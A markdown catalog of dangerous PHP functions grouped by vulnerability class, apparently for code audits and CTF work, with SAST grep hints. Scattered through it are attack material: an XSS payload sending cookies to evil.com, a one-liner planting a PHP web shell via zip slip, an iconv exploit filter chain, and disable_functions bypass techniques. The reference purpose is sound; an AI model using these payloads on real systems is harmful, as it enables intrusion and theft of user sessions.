# PHP Sinks

Comprehensive PHP dangerous function catalog. Extracted from real CTF challenges, PayloadsAllTheThings, HackTricks, and SAST tool rulesets.

---

## RCE Sinks

**Direct command execution:**
`system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, backtick operator

**Code execution:**
`eval()`, `assert()` (PHP < 8.0 evaluates string args), `preg_replace()` with `/e` modifier (PHP < 7.0), `create_function()`, `call_user_func()`, `call_user_func_array()`, `array_map()`, `array_filter()`, `usort()` / `uasort()` / `uksort()` with callback, `array_walk()`, `array_reduce()`, `ob_start()` with callback, `register_shutdown_function()`, `register_tick_function()`, `set_error_handler()`, `set_exception_handler()`

**Extended callback sinks (often missed by SAST):**
`array_diff_uassoc()`, `array_diff_ukey()`, `array_intersect_uassoc()`, `array_intersect_ukey()`, `array_udiff()`, `array_udiff_assoc()`, `array_udiff_uassoc()`, `array_uintersect()`, `array_uintersect_assoc()`, `array_uintersect_uassoc()`, `iterator_apply()`, `preg_replace_callback()`, `mb_ereg_replace_callback()`, `xml_set_character_data_handler()`, `xml_set_default_handler()`, `xml_set_element_handler()`, `xml_set_end_namespace_decl_handler()`, `xml_set_external_entity_ref_handler()`, `xml_set_notation_decl_handler()`, `xml_set_processing_instruction_handler()`, `xml_set_start_namespace_decl_handler()`, `xml_set_unparsed_entity_decl_handler()`, `stream_filter_register()`, `sqlite_create_function()`, `sqlite_create_aggregate()`, `spl_autoload_register()`, `session_set_save_handler()`

**Callback argument positions** (grep target: arg at position N is the callable — attacker-controlled string → RCE):

| Function | Callback position |
|---|---|
| `ob_start` | 0 |
| `array_filter` | 1 |
| `array_map` | 0 |
| `array_reduce` | 1 |
| `array_walk` | 1 |
| `array_walk_recursive` | 1 |
| `array_diff_uassoc` | -1 (last) |
| `array_diff_ukey` | -1 |
| `array_intersect_uassoc` | -1 |
| `array_intersect_ukey` | -1 |
| `array_udiff` | -1 |
| `array_udiff_assoc` | -1 |
| `array_udiff_uassoc` | -1, -2 |
| `array_uintersect` | -1 |
| `array_uintersect_assoc` | -1 |
| `array_uintersect_uassoc` | -1, -2 |
| `uasort` | 1 |
| `uksort` | 1 |
| `usort` | 1 |
| `preg_replace_callback` | 1 |
| `iterator_apply` | 1 |
| `call_user_func` | 0 |
| `call_user_func_array` | 0 |
| `assert_options` | 1 |
| `spl_autoload_register` | 0 |
| `register_shutdown_function` | 0 |
| `register_tick_function` | 0 |
| `set_error_handler` | 0 |
| `set_exception_handler` | 0 |
| `session_set_save_handler` | 0, 1, 2, 3, 4, 5 |
| `sqlite_create_aggregate` | 2, 3 |
| `sqlite_create_function` | 2 |

**SAST note:** Functions accepting callbacks where the callable is user-controlled execute arbitrary PHP. Even functions that don't pass user data as the callback argument can leak information — e.g. if the attacker can invoke `phpinfo` as the callback via `call_user_func($_GET['fn'])`.

**LFI/RFI via include:** `include`, `include_once`, `require`, `require_once` with variable path are the primary LFI/RFI vector. When `allow_url_include=On`, remote URLs work directly. When off, use PHP stream wrappers (`php://input`, `data://`, `expect://`, `zip://`, `phar://`) or chain with a file-write sink first.

**Dynamic inclusion:**
`include`, `include_once`, `require`, `require_once` with variable path — also exploitable via PHP stream wrappers: `php://input`, `php://filter`, `data://text/plain;base64,<b64>`, `expect://id` (RCE via expect extension), `zip://archive.zip#shell.php`, `phar://upload.jpg/shell.php`

**Variable manipulation to code exec:**
`extract()` (variable overwrite leading to control flow hijack), `parse_str()` without second arg (register_globals-like), `$$var` variable variables, `compact()` with tainted keys

**Indirect RCE:**
`unserialize()` (gadget chains to `__destruct`/`__wakeup`), `mail()` / `mb_send_mail()` (5th param -> `-X` log to webshell, or LD_PRELOAD), `imap_open()` (LD_PRELOAD via `-oProxyCommand`), `dl()` (load malicious .so), FFI (PHP 7.4+ foreign function interface), `putenv()` + `mail()` (LD_PRELOAD technique), ImageMagick via `Imagick` class (delegate command injection, MSL reads)

**Disable_functions bypass vectors:**
LD_PRELOAD via `putenv()` + `mail()`/`mb_send_mail()`/`error_log()`, FFI, Shellshock (`() { :; };`), FastCGI protocol to php-fpm, COM class (Windows), `iconv` with custom charset module, PHP UAF exploits (PHP 7.0-7.3), `pcntl_exec()`, Apache `mod_cgi` bypass, GCC `__attribute__((constructor))`, Bash env variable function injection, SplStack/SplDoublyLinkedList UAF, `proc_open()` (often missed in disable lists)

---

## File Read Sinks

`file_get_contents()`, `readfile()`, `file()`, `fopen()` + `fread()`, `fgets()`, `fpassthru()`, `include` / `require` (with php://filter for base64 extraction), `highlight_file()` / `show_source()`, `php://filter/convert.base64-encode/resource=`, `SplFileObject`, `simplexml_load_file()` (XXE to file read), `DOMDocument::load()` (XXE), `glob()` (directory listing for open_basedir bypass), `scandir()`, `opendir()` + `readdir()`, `parse_ini_file()`, `getimagesize()` (reads file header), `gzfile()`, `gzopen()`, `readgzfile()`, `bzopen()`

---

## File Write Sinks

`file_put_contents()`, `fwrite()` / `fputs()`, `move_uploaded_file()`, `copy()`, `rename()`, `mkdir()`, SQL `INTO OUTFILE` / `INTO DUMPFILE`, `DOMDocument::save()`, `ftp_put()`, `imagepng()` / `imagejpeg()` (writing image with embedded PHP), `ZipArchive::extractTo()` (zip slip), `PharData::extractTo()`

---

## SSRF Sinks

`file_get_contents()`, `curl_exec()` / `curl_multi_exec()`, `fopen()` with URL wrappers, `SoapClient` (`__call` triggers request to attacker-controlled URL), `simplexml_load_file()`, `DOMDocument::load()`, `get_headers()`, `readfile()` with URL, `copy()` with URL source, `getimagesize()` with URL, `exif_read_data()` from URL, `mime_content_type()` with URL

---

## XXE Sinks

`simplexml_load_string()`, `simplexml_load_file()`, `DOMDocument::loadXML()`, `XMLReader::xml()`, `SimpleXMLElement` constructor, any XML parser without `LIBXML_NOENT` and `libxml_disable_entity_loader(true)` (pre-PHP 8.0)

---

## Deserialization Sinks

**Direct:** `unserialize()`

**Phar-triggered** (any file operation on `phar://` URI deserializes metadata):
`file_exists()`, `is_dir()`, `is_file()`, `file_get_contents()`, `fopen()`, `file()`, `filesize()`, `filetype()`, `filemtime()`, `stat()`, `copy()`, `rename()`, `unlink()`, `finfo->file()`, `md5_file()`, `sha1_file()`, `hash_file()`, `getimagesize()`, `exif_read_data()`, `is_readable()`, `is_writable()`, `fileperms()`, `fileinode()`

**Gadget chain triggers:** `__wakeup()`, `__destruct()`, `__toString()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__invoke()`, `__debugInfo()`, `__serialize()` / `__unserialize()` (PHP 7.4+), `Serializable::unserialize()`

**Phar + iconv chain:** `phar://` triggers deserialization AND can chain to iconv if the gadget chain reaches a file read with `convert.iconv` filter → double RCE vector from single Phar trigger.

---

## Type Juggling Traps

**Loose comparison (`==`) bypasses:**
- `"0e12345" == "0e99999"` -> `true` (both parse as float 0) — magic hash attacks
- `0 == "any_string"` -> `true` (PHP < 8.0)
- `"" == null` -> `true`
- `"0" == false` -> `true`
- `"php" == 0` -> `true` (PHP < 8.0)
- `[] == false` -> `true`
- `"0x1A" == 26` -> `true` (PHP < 7.0)
- `"0e0" == "0"` -> `true`

**Functions vulnerable to type confusion:**
- `in_array($needle, $haystack)` without 3rd arg `true` (strict)
- `array_search()` without strict flag
- `strcmp()` with array input -> `NULL` which `== 0` is `true`
- `md5()` / `sha1()` with array input -> `NULL`
- `is_numeric()` accepts hex (`0x...`) in PHP < 7.0, scientific notation always
- `intval()` truncation: `intval("1e1")` -> `1` but `1e1 == 10`
- `json_decode()` returning integer where string expected
- `switch/case` uses loose comparison
- `preg_match()` returns `0` or `false` — loose comparison treats both as falsy
- `substr()` with negative length on short strings returns `false`

---

## Security-Disabling Functions

`ini_set()` (change `open_basedir`, `disable_functions`, `allow_url_include`), `ini_restore()`, `putenv()` (set `LD_PRELOAD`, `PATH`, `LD_LIBRARY_PATH`), `set_include_path()`, `apache_setenv()`, `set_time_limit(0)`, `extract()` (overwrite arbitrary variables), `parse_str()` without second arg (register_globals-like), `import_request_variables()` (removed PHP 5.4)

---

## Process Control Sinks

`proc_open()`, `proc_close()`, `proc_terminate()`, `proc_nice()`, `proc_get_status()`, `apache_child_terminate()`, `posix_kill()`, `posix_setuid()`, `posix_setsid()`, `posix_setpgid()`, `pcntl_signal()`, `pcntl_fork()`, `pcntl_alarm()`

---

## iconv Sinks (CVE-2024-2961)

**Critical:** glibc `iconv()` buffer overflow when converting to `ISO-2022-CN-EXT` charset. Exploitable through any PHP function that triggers charset conversion.

**Direct iconv sinks:**
`iconv()`, `iconv_mime_decode()`, `iconv_mime_decode_headers()`, `mb_convert_encoding()` (when using iconv backend), `iconv_strpos()`, `iconv_strrpos()`, `iconv_strlen()`, `iconv_substr()`

**Indirect iconv sinks (via php://filter):**
Any file read function combined with `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT`:
`file_get_contents()`, `readfile()`, `include`/`require`, `fopen()`, `file()`, `SplFileObject`, `highlight_file()`, `show_source()`, `finfo->file()`, `getimagesize()`, `exif_read_data()`, `hash_file()`, `md5_file()`, `sha1_file()`

**Exploitation:** `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd` triggers heap overflow → controlled write → RCE. Tool: `ambionics/cnext-exploits`.

**Impact:** Elevates ALL PHP file read vulnerabilities from High (information disclosure) to Critical (RCE). No `allow_url_include` needed, no file write needed, 100% reliable, works PHP 7.0-8.3.

**SAST detection:** Semgrep rule `php.lang.security.iconv-usage` (custom), grep for `ISO-2022-CN-EXT` or `convert.iconv` in filter chains.

---

## Information Disclosure Sinks

`phpinfo()`, `getenv()`, `get_cfg_var()`, `get_current_user()`, `getcwd()`, `getmyuid()` / `getmygid()`, `getmypid()`, `getmyinode()`, `getlastmod()`, `disk_free_space()` / `disk_total_space()`, `posix_getlogin()`, `posix_ttyname()`, `posix_getpwuid()`, `posix_getgrgid()`, `posix_getpwnam()`, MySQL `LOAD_FILE()`, MySQL `LOAD DATA LOCAL INFILE`

---

## Magic Hash Values (md5 starts with `0e` + digits only)

`240610708`, `QNKCDZO`, `aabg7XSs`, `aabC9RqS`, `s878926199a`, `s155964671a`, `s214587387a`, `0e215962017`

**Hash comparison exploits:**
- MD5 magic hashes: `0e215962017` -> md5 starts with `0e[0-9]+`
- SHA1 magic hashes exist too
- `password_verify()` is safe (always strict)
- `hash_equals()` is safe (timing-safe + strict)

---

## CDATA / Feed Parser XSS Sinks

RSS/Atom feed parsers that render `CDATA` content as HTML without sanitization. CDATA blocks bypass XML-level escaping — the content inside `<![CDATA[...]]>` is treated as raw text by the XML parser but rendered as HTML by the display layer.

**Vulnerable patterns:**
- `simplexml_load_string()` → accessing `->description` or `->content` → echoing without `htmlspecialchars()`
- `DOMDocument::loadXML()` → `$node->textContent` or `$node->nodeValue` from CDATA → direct output
- `XMLReader` → reading CDATA nodes → rendering in HTML template
- WordPress `fetch_feed()` / SimplePie → custom templates rendering `$item->get_description()` with `|raw` or without escaping
- Any RSS aggregator, feed reader, or podcast app displaying feed content

**Payload:** `<![CDATA[<img src=x onerror="fetch('//evil.com/'+document.cookie)">]]>` inside `<description>` or `<content:encoded>`

**Why it bypasses:** XML parsers don't escape CDATA content (by spec). If the app treats XML parsing as "input sanitization", the HTML payload passes through untouched to the rendering layer.

---

## CRLF Injection Sinks

**`mail()` — 3rd parameter (additional headers):** Direct CRLF injection allows header injection and spam relay. Combined with `putenv()` setting `LD_PRELOAD` or the `-X` flag via 5th param for RCE (see Indirect RCE above).

**`header()` — location redirect without `die()`:** `header("Location: /login")` without an immediate `exit`/`die()` continues executing the rest of the script. On old PHP/Apache stacks, CRLF injection via the URL value allows injecting arbitrary response headers or XSS. The script-continues-after-redirect pattern is a logic flaw even without CRLF — authentication guards that only call `header()` and return are bypassable by ignoring the 302 response.

**Grep targets:** `header(` without following `die\|exit`, `mail(` with 5 args, `mb_send_mail(`

---

## Filesystem Sinks (RATS Taxonomy)

Complete enumeration for grep/semgrep patterns. According to RATS, all filesystem functions in PHP are potentially dangerous — many are exploitable via `allow_url_fopen=On` (URL as path) or via directory traversal in the path argument.

**Open handlers:**
`fopen`, `tmpfile`, `bzopen`, `gzopen`, `SplFileObject->__construct`

**Write / modify filesystem:**
`chgrp`, `chmod`, `chown`, `copy`, `file_put_contents`, `lchgrp`, `lchown`, `link`, `mkdir`, `move_uploaded_file`, `rename`, `rmdir`, `symlink`, `tempnam`, `touch`, `unlink`

**Image write with path arg (2nd parameter is destination path):**
`imagepng`, `imagewbmp`, `image2wbmp`, `imagejpeg`, `imagexbm`, `imagegif`, `imagegd`, `imagegd2`, `iptcembed`

**FTP write/read:**
`ftp_get`, `ftp_nb_get`, `ftp_put`, `ftp_nb_put`

**Read from filesystem** (also trigger Phar deserialization if path starts with `phar://`):
`file_exists`, `file_get_contents`, `file`, `fileatime`, `filectime`, `filegroup`, `fileinode`, `filemtime`, `fileowner`, `fileperms`, `filesize`, `filetype`, `glob`, `is_dir`, `is_executable`, `is_file`, `is_link`, `is_readable`, `is_uploaded_file`, `is_writable`, `is_writeable`, `linkinfo`, `lstat`, `parse_ini_file`, `pathinfo`, `readfile`, `readlink`, `realpath`, `stat`

**Compressed file read:**
`gzfile`, `readgzfile`

**Image read (also SSRF if `allow_url_fopen=On`):**
`getimagesize`, `imagecreatefromgif`, `imagecreatefromjpeg`, `imagecreatefrompng`, `imagecreatefromwbmp`, `imagecreatefromxbm`, `imagecreatefromxpm`

**EXIF / metadata read:**
`exif_read_data`, `read_exif_data`, `exif_thumbnail`, `exif_imagetype`

**Hash over file (trigger Phar deserialization):**
`hash_file`, `hash_hmac_file`, `hash_update_file`, `md5_file`, `sha1_file`

**Source disclosure:**
`highlight_file`, `show_source`, `php_strip_whitespace`, `get_meta_tags`

**`allow_url_fopen=On` escalation:** Any function accepting a file path also accepts a URL when `allow_url_fopen` is on. `copy($_GET['s'], $_GET['d'])` becomes an arbitrary file upload vector — attacker fetches a remote PHP shell and writes it anywhere the web process can write.

---

## Archive Extraction Sinks (Zip Slip)

File extraction functions vulnerable to path traversal via crafted archive entries containing `../` in filenames.

**Vulnerable functions:**
- `ZipArchive::extractTo()` — extracts all files to target directory, does NOT validate entry paths. A zip entry named `../../../etc/cron.d/shell` writes outside the intended directory
- `PclZip::extract()` — same vulnerability, `PCLZIP_OPT_PATH` does not prevent traversal in entry names
- `PharData::extractTo()` — extracts tar/zip archives, same path traversal risk
- `tar` via `exec()`/`system()` — `tar xf` without `--strip-components` or path validation

**Exploitation:**
1. Create malicious archive: `python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../shell.php','<?php system($_GET[\"cmd\"]);?>'); z.close()"`
2. Upload to target's file upload endpoint
3. Target extracts → `shell.php` written to web root or other writable directory above extraction path

**Safe pattern:** After extraction, validate every extracted file's real path starts with the intended directory: `realpath($extracted) starts with realpath($target_dir)`

**SAST detection:** Semgrep `php.lang.security.ziparchive-extractto-no-validation`, grep for `extractTo(` or `PclZip` without subsequent `realpath()` / `str_starts_with()` checks

---

## Merged Additions from External Sink Catalogue

> Merged from `php_sink_catalogue_472.json` (2026-06-02). 358 new sink entries across 19 vulnerability classes.
> Source: comprehensive PHP sink enumeration tool derived from RIPS, Psalm, Semgrep, PHP manual, and framework documentation.

### RCE Sinks — Command Execution

- `backticks()` — backticks os command execution
- `expect_popen()` — expect_popen os command execution
- `w32api_invoke_function()` — w32api_invoke_function os command execution
- `w32api_register_function()` — w32api_register_function os command execution

- `Symfony\Component\Process\Process::__construct()` (php) — Symfony\Component\Process\Process::__construct framework process execution
- `Symfony\Component\Process\Process::fromShellCommandline()` (php) — Symfony\Component\Process\Process::fromShellCommandline framework process execution

### RCE Sinks — Code Execution

- `mb_eregi_replace()` — mb_eregi_replace code execution / dynamic evaluation
- `preg_filter()` — preg_filter code execution / dynamic evaluation
- `preg_replace_callback_array()` — preg_replace_callback_array code execution / dynamic evaluation
- `mb_eregi_replace_callback()` — mb_eregi_replace_callback code execution / dynamic evaluation

### File Inclusion Sinks

- `parsekit_compile_file()` — parsekit_compile_file file inclusion / code loading
- `php_check_syntax()` — php_check_syntax file inclusion / code loading
- `runkit_import()` — runkit_import file inclusion / code loading
- `virtual()` — virtual file inclusion / code loading
- `opcache_compile_file()` — opcache_compile_file file inclusion / code loading

### SQL Injection Sinks

- `dba_open()` — dba_open sql execution / query construction
- `dba_popen()` — dba_popen sql execution / query construction
- `dba_insert()` — dba_insert sql execution / query construction
- `dba_fetch()` — dba_fetch sql execution / query construction
- `dba_delete()` — dba_delete sql execution / query construction
- `dbx_query()` — dbx_query sql execution / query construction
- `odbc_do()` — odbc_do sql execution / query construction
- `odbc_exec()` — odbc_exec sql execution / query construction
- `odbc_execute()` — odbc_execute sql execution / query construction
- `db2_exec()` — db2_exec sql execution / query construction
- `db2_execute()` — db2_execute sql execution / query construction
- `fbsql_db_query()` — fbsql_db_query sql execution / query construction
- `fbsql_query()` — fbsql_query sql execution / query construction
- `ibase_query()` — ibase_query sql execution / query construction
- `ibase_execute()` — ibase_execute sql execution / query construction
- `ifx_query()` — ifx_query sql execution / query construction
- `ifx_do()` — ifx_do sql execution / query construction
- `ingres_query()` — ingres_query sql execution / query construction
- `ingres_execute()` — ingres_execute sql execution / query construction
- `ingres_unbuffered_query()` — ingres_unbuffered_query sql execution / query construction
- `msql_db_query()` — msql_db_query sql execution / query construction
- `msql_query()` — msql_query sql execution / query construction
- `msql()` — msql sql execution / query construction
- `mssql_query()` — mssql_query sql execution / query construction
- `mssql_execute()` — mssql_execute sql execution / query construction
- `mysql_db_query()` — mysql_db_query sql execution / query construction
- `mysql_query()` — mysql_query sql execution / query construction
- `mysql_unbuffered_query()` — mysql_unbuffered_query sql execution / query construction
- `mysqli_stmt_execute()` — mysqli_stmt_execute sql execution / query construction
- `mysqli_query()` — mysqli_query sql execution / query construction
- `mysqli_real_query()` — mysqli_real_query sql execution / query construction
- `mysqli_multi_query()` — mysqli_multi_query sql execution / query construction
- `mysqli_master_query()` — mysqli_master_query sql execution / query construction
- `oci_execute()` — oci_execute sql execution / query construction
- `ociexecute()` — ociexecute sql execution / query construction
- `ovrimos_exec()` — ovrimos_exec sql execution / query construction
- `ovrimos_execute()` — ovrimos_execute sql execution / query construction
- `ora_do()` — ora_do sql execution / query construction
- `ora_exec()` — ora_exec sql execution / query construction
- `pg_query()` — pg_query sql execution / query construction
- `pg_send_query()` — pg_send_query sql execution / query construction
- `pg_send_query_params()` — pg_send_query_params sql execution / query construction
- `pg_send_prepare()` — pg_send_prepare sql execution / query construction
- `pg_prepare()` — pg_prepare sql execution / query construction
- `sqlite_open()` — sqlite_open sql execution / query construction
- `sqlite_popen()` — sqlite_popen sql execution / query construction
- `sqlite_array_query()` — sqlite_array_query sql execution / query construction
- `arrayQuery()` — arrayQuery sql execution / query construction
- `singleQuery()` — singleQuery sql execution / query construction
- `sqlite_query()` — sqlite_query sql execution / query construction
- `sqlite_exec()` — sqlite_exec sql execution / query construction
- `sqlite_single_query()` — sqlite_single_query sql execution / query construction
- `sqlite_unbuffered_query()` — sqlite_unbuffered_query sql execution / query construction
- `sybase_query()` — sybase_query sql execution / query construction
- `sybase_unbuffered_query()` — sybase_unbuffered_query sql execution / query construction
- `PDO::query()` — PDO::query sql execution / query construction
- `PDO::exec()` — PDO::exec sql execution / query construction
- `PDO::prepare()` — PDO::prepare sql execution / query construction
- `PDOStatement::execute()` — PDOStatement::execute sql execution / query construction
- `SQLite3::query()` — SQLite3::query sql execution / query construction
- `SQLite3::exec()` — SQLite3::exec sql execution / query construction
- `SQLite3::prepare()` — SQLite3::prepare sql execution / query construction
- `SQLite3::querySingle()` — SQLite3::querySingle sql execution / query construction
- `mysqli::query()` — mysqli::query sql execution / query construction
- `mysqli::real_query()` — mysqli::real_query sql execution / query construction
- `mysqli::multi_query()` — mysqli::multi_query sql execution / query construction
- `mysqli::prepare()` — mysqli::prepare sql execution / query construction
- `mysqli_stmt::execute()` — mysqli_stmt::execute sql execution / query construction

### Framework SQL Injection Sinks


- `DB::raw()` (laravel) — DB::raw framework sql raw expression
- `DB::select()` (laravel) — DB::select framework sql raw expression
- `DB::statement()` (laravel) — DB::statement framework sql raw expression
- `DB::unprepared()` (laravel) — DB::unprepared framework sql raw expression
- `DB::update()` (laravel) — DB::update framework sql raw expression
- `DB::delete()` (laravel) — DB::delete framework sql raw expression
- `DB::insert()` (laravel) — DB::insert framework sql raw expression
- `DB::affectingStatement()` (laravel) — DB::affectingStatement framework sql raw expression
- `DB::scalar()` (laravel) — DB::scalar framework sql raw expression
- `DB::cursor()` (laravel) — DB::cursor framework sql raw expression
- `selectRaw()` (laravel) — selectRaw framework sql raw expression
- `whereRaw()` (laravel) — whereRaw framework sql raw expression
- `orWhereRaw()` (laravel) — orWhereRaw framework sql raw expression
- `havingRaw()` (laravel) — havingRaw framework sql raw expression
- `orHavingRaw()` (laravel) — orHavingRaw framework sql raw expression
- `orderByRaw()` (laravel) — orderByRaw framework sql raw expression
- `groupByRaw()` (laravel) — groupByRaw framework sql raw expression
- `fromRaw()` (laravel) — fromRaw framework sql raw expression
- `joinRaw()` (laravel) — joinRaw framework sql raw expression
- `whereIntegerInRaw()` (laravel) — whereIntegerInRaw framework sql raw expression
- `whereIntegerNotInRaw()` (laravel) — whereIntegerNotInRaw framework sql raw expression
- `query()->raw()` (laravel) — query()->raw framework sql raw expression
- `Doctrine\DBAL\Connection::executeQuery()` (doctrine) — Doctrine\DBAL\Connection::executeQuery framework sql raw expression
- `Doctrine\DBAL\Connection::executeStatement()` (doctrine) — Doctrine\DBAL\Connection::executeStatement framework sql raw expression
- `Doctrine\DBAL\Connection::prepare()` (doctrine) — Doctrine\DBAL\Connection::prepare framework sql raw expression
- `Doctrine\DBAL\Connection::query()` (doctrine) — Doctrine\DBAL\Connection::query framework sql raw expression
- `Doctrine\ORM\EntityManager::createQuery()` (doctrine) — Doctrine\ORM\EntityManager::createQuery framework sql raw expression
- `Doctrine\ORM\EntityManager::createNativeQuery()` (doctrine) — Doctrine\ORM\EntityManager::createNativeQuery framework sql raw expression
- `Doctrine\ORM\EntityManager::getConnection()->executeQuery()` (doctrine) — Doctrine\ORM\EntityManager::getConnection()->executeQuery framework sql raw expression
- `Doctrine\ORM\QueryBuilder::where()` (doctrine) — Doctrine\ORM\QueryBuilder::where framework sql raw expression
- `Doctrine\ORM\QueryBuilder::andWhere()` (doctrine) — Doctrine\ORM\QueryBuilder::andWhere framework sql raw expression
- `Doctrine\ORM\QueryBuilder::orWhere()` (doctrine) — Doctrine\ORM\QueryBuilder::orWhere framework sql raw expression
- `Doctrine\ORM\QueryBuilder::orderBy()` (doctrine) — Doctrine\ORM\QueryBuilder::orderBy framework sql raw expression
- `Doctrine\ORM\QueryBuilder::groupBy()` (doctrine) — Doctrine\ORM\QueryBuilder::groupBy framework sql raw expression
- `Doctrine\ORM\QueryBuilder::having()` (doctrine) — Doctrine\ORM\QueryBuilder::having framework sql raw expression
- `$wpdb->query()` (wordpress) — $wpdb->query framework sql raw expression
- `$wpdb->get_results()` (wordpress) — $wpdb->get_results framework sql raw expression
- `$wpdb->get_row()` (wordpress) — $wpdb->get_row framework sql raw expression
- `$wpdb->get_col()` (wordpress) — $wpdb->get_col framework sql raw expression
- `$wpdb->get_var()` (wordpress) — $wpdb->get_var framework sql raw expression
- `$wpdb->prepare()` (wordpress) — $wpdb->prepare framework sql raw expression
- `$wpdb->replace()` (wordpress) — $wpdb->replace framework sql raw expression
- `$wpdb->insert()` (wordpress) — $wpdb->insert framework sql raw expression
- `$wpdb->update()` (wordpress) — $wpdb->update framework sql raw expression
- `$wpdb->delete()` (wordpress) — $wpdb->delete framework sql raw expression
- `esc_sql()` (wordpress) — esc_sql framework sql raw expression
- `sanitize_sql_orderby()` (wordpress) — sanitize_sql_orderby framework sql raw expression

### File Read Sinks

- `bzread()` — bzread file disclosure / path traversal read
- `bzflush()` — bzflush file disclosure / path traversal read
- `dio_read()` — dio_read file disclosure / path traversal read
- `eio_readdir()` — eio_readdir file disclosure / path traversal read
- `fdf_open()` — fdf_open file disclosure / path traversal read
- `finfo_file()` — finfo_file file disclosure / path traversal read
- `fflush()` — fflush file disclosure / path traversal read
- `fgetc()` — fgetc file disclosure / path traversal read
- `fgetcsv()` — fgetcsv file disclosure / path traversal read
- `fgetss()` — fgetss file disclosure / path traversal read
- `fscanf()` — fscanf file disclosure / path traversal read
- `ftok()` — ftok file disclosure / path traversal read
- `gzgetc()` — gzgetc file disclosure / path traversal read
- `gzgets()` — gzgets file disclosure / path traversal read
- `gzgetss()` — gzgetss file disclosure / path traversal read
- `gzread()` — gzread file disclosure / path traversal read
- `gzpassthru()` — gzpassthru file disclosure / path traversal read
- `imagecreatefromjpg()` — imagecreatefromjpg file disclosure / path traversal read
- `imagecreatefromgd2()` — imagecreatefromgd2 file disclosure / path traversal read
- `imagecreatefromgd2part()` — imagecreatefromgd2part file disclosure / path traversal read
- `imagecreatefromgd()` — imagecreatefromgd file disclosure / path traversal read
- `imagecreatefrombmp()` — imagecreatefrombmp file disclosure / path traversal read
- `imagecreatefromwebp()` — imagecreatefromwebp file disclosure / path traversal read
- `imagecreatefromavif()` — imagecreatefromavif file disclosure / path traversal read
- `stream_get_contents()` — stream_get_contents file disclosure / path traversal read
- `stream_get_line()` — stream_get_line file disclosure / path traversal read
- `xdiff_file_bdiff()` — xdiff_file_bdiff file disclosure / path traversal read
- `xdiff_file_bpatch()` — xdiff_file_bpatch file disclosure / path traversal read
- `xdiff_file_diff_binary()` — xdiff_file_diff_binary file disclosure / path traversal read
- `xdiff_file_diff()` — xdiff_file_diff file disclosure / path traversal read
- `xdiff_file_merge3()` — xdiff_file_merge3 file disclosure / path traversal read
- `xdiff_file_patch_binary()` — xdiff_file_patch_binary file disclosure / path traversal read
- `xdiff_file_patch()` — xdiff_file_patch file disclosure / path traversal read
- `xdiff_file_rabdiff()` — xdiff_file_rabdiff file disclosure / path traversal read
- `yaml_parse_file()` — yaml_parse_file file disclosure / path traversal read
- `zip_open()` — zip_open file disclosure / path traversal read

- `Illuminate\Filesystem\Filesystem::get()` (php) — Illuminate\Filesystem\Filesystem::get framework file read
- `Illuminate\Support\Facades\File::get()` (php) — Illuminate\Support\Facades\File::get framework file read

### File Write Sinks

- `bzwrite()` — bzwrite file manipulation / path traversal write
- `dio_write()` — dio_write file manipulation / path traversal write
- `eio_chmod()` — eio_chmod file manipulation / path traversal write
- `eio_chown()` — eio_chown file manipulation / path traversal write
- `eio_mkdir()` — eio_mkdir file manipulation / path traversal write
- `eio_mknod()` — eio_mknod file manipulation / path traversal write
- `eio_rmdir()` — eio_rmdir file manipulation / path traversal write
- `eio_write()` — eio_write file manipulation / path traversal write
- `eio_unlink()` — eio_unlink file manipulation / path traversal write
- `event_buffer_write()` — event_buffer_write file manipulation / path traversal write
- `fputcsv()` — fputcsv file manipulation / path traversal write
- `fprintf()` — fprintf file manipulation / path traversal write
- `ftruncate()` — ftruncate file manipulation / path traversal write
- `gzwrite()` — gzwrite file manipulation / path traversal write
- `gzputs()` — gzputs file manipulation / path traversal write
- `posix_mknod()` — posix_mknod file manipulation / path traversal write
- `recode_file()` — recode_file file manipulation / path traversal write
- `shmop_write()` — shmop_write file manipulation / path traversal write
- `vfprintf()` — vfprintf file manipulation / path traversal write
- `xdiff_file_bdiff()` — xdiff_file_bdiff file manipulation / path traversal write
- `xdiff_file_bpatch()` — xdiff_file_bpatch file manipulation / path traversal write
- `xdiff_file_diff_binary()` — xdiff_file_diff_binary file manipulation / path traversal write
- `xdiff_file_diff()` — xdiff_file_diff file manipulation / path traversal write
- `xdiff_file_merge3()` — xdiff_file_merge3 file manipulation / path traversal write
- `xdiff_file_patch_binary()` — xdiff_file_patch_binary file manipulation / path traversal write
- `xdiff_file_patch()` — xdiff_file_patch file manipulation / path traversal write
- `xdiff_file_rabdiff()` — xdiff_file_rabdiff file manipulation / path traversal write
- `yaml_emit_file()` — yaml_emit_file file manipulation / path traversal write
- `umask()` — umask file manipulation / path traversal write
- `chdir()` — chdir file manipulation / path traversal write

- `Symfony\Component\Filesystem\Filesystem::copy()` (php) — Symfony\Component\Filesystem\Filesystem::copy framework file mutation
- `Symfony\Component\Filesystem\Filesystem::rename()` (php) — Symfony\Component\Filesystem\Filesystem::rename framework file mutation
- `Symfony\Component\Filesystem\Filesystem::remove()` (php) — Symfony\Component\Filesystem\Filesystem::remove framework file mutation
- `Symfony\Component\Filesystem\Filesystem::mkdir()` (php) — Symfony\Component\Filesystem\Filesystem::mkdir framework file mutation
- `Illuminate\Filesystem\Filesystem::put()` (php) — Illuminate\Filesystem\Filesystem::put framework file mutation
- `Illuminate\Filesystem\Filesystem::copy()` (php) — Illuminate\Filesystem\Filesystem::copy framework file mutation
- `Illuminate\Filesystem\Filesystem::move()` (php) — Illuminate\Filesystem\Filesystem::move framework file mutation
- `Illuminate\Support\Facades\File::put()` (php) — Illuminate\Support\Facades\File::put framework file mutation
- `Illuminate\Support\Facades\Storage::put()` (php) — Illuminate\Support\Facades\Storage::put framework file mutation

### SSRF / Protocol Injection Sinks

- `curl_setopt()` — curl_setopt ssrf / protocol injection / outbound network
- `curl_setopt_array()` — curl_setopt_array ssrf / protocol injection / outbound network
- `curl_init()` — curl_init ssrf / protocol injection / outbound network
- `cyrus_query()` — cyrus_query ssrf / protocol injection / outbound network
- `fsockopen()` — fsockopen ssrf / protocol injection / outbound network
- `pfsockopen()` — pfsockopen ssrf / protocol injection / outbound network
- `stream_socket_client()` — stream_socket_client ssrf / protocol injection / outbound network
- `stream_socket_server()` — stream_socket_server ssrf / protocol injection / outbound network
- `socket_bind()` — socket_bind ssrf / protocol injection / outbound network
